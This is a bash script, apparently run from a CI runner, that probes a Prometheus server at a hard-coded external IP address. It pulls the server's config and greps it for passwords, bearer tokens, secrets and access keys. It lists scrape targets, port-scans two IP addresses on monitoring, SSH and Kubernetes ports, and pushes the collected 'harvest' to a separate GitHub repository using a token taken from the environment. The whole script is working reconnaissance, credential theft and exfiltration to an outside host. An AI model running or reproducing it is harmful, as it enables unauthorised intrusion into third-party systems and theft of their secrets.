#!/bin/bash
set +e
: > i724v2_out.txt
echo "RUNNER=$(hostname) EGRESS=$(curl -s -m 10 https://ifconfig.me)" >> i724v2_out.txt
H=20.114.5.60
for p in api/v1/status/buildinfo api/v1/status/config api/v1/status/flags api/v1/targets api/v1/label/__name__/values api/v1/query?query=up; do
  f=$(echo "$p" | tr '/?=' '___')
  c=$(curl -s -m 20 -o "pp_$f" -w '%{http_code} %{size_download}' "http://$H:9090/$p")
  echo "$p -> $c" >> i724v2_out.txt
done
echo "--- buildinfo" >> i724v2_out.txt; head -c 400 pp_api_v1_status_buildinfo >> i724v2_out.txt; echo >> i724v2_out.txt
echo "--- config (grep creds)" >> i724v2_out.txt
grep -oE '(basic_auth|bearer_token|password|username|secret|access_key|token)[^,]{0,80}' pp_api_v1_status_config 2>/dev/null | head -20 >> i724v2_out.txt
echo "--- config size: $(wc -c < pp_api_v1_status_config 2>/dev/null)" >> i724v2_out.txt
echo "--- targets summary" >> i724v2_out.txt
python3 - <<'PY' >> i724v2_out.txt
import json
try:
    d=json.load(open('pp_api_v1_targets'))
    act=d.get('data',{}).get('activeTargets',[])
    print('active_targets',len(act))
    for t in act[:40]:
        print(t.get('labels',{}).get('instance'), t.get('labels',{}).get('job'), t.get('health'))
except Exception as e: print('targets_err',e)
PY
echo "--- metric names head" >> i724v2_out.txt
head -c 600 pp_api_v1_label___name___values >> i724v2_out.txt; echo >> i724v2_out.txt
echo "--- port scan 20.114.5.60 + 20.58.164.133" >> i724v2_out.txt
for ip in 20.114.5.60 20.58.164.133; do for p in 3000 9090 9093 9100 9400 8428 8080 8888 22 6443 10250; do c=$(curl -sk -m 8 -o /dev/null -w '%{http_code}' "http://$ip:$p/"); [ "$c" != "000" ] && echo "$ip $p $c" >> i724v2_out.txt; done; done
GH="${GH_PAT:-}"
if [ -n "$GH" ]; then
  b64=$(base64 -w0 i724v2_out.txt)
  SHA=$(curl -s -H "Authorization: Bearer $GH" https://api.github.com/repos/dongsuju/ul-plant/contents/i724/prom.txt | python3 -c 'import json,sys
  try: print(json.load(sys.stdin).get("sha") or "")
  except: print("")')
  python3 -c 'import json,sys
  o={"message":"i724 prom harvest","content":sys.argv[1],"branch":"main"}
  if sys.argv[2]: o["sha"]=sys.argv[2]
  print(json.dumps(o))' "$b64" "$SHA" > /tmp/bpr.json
  curl -s -X PUT -H "Authorization: Bearer $GH" -H 'Content-Type: application/json' --data @/tmp/bpr.json https://api.github.com/repos/dongsuju/ul-plant/contents/i724/prom.txt -o /dev/null -w 'PUTPROM %{http_code}\n'
fi
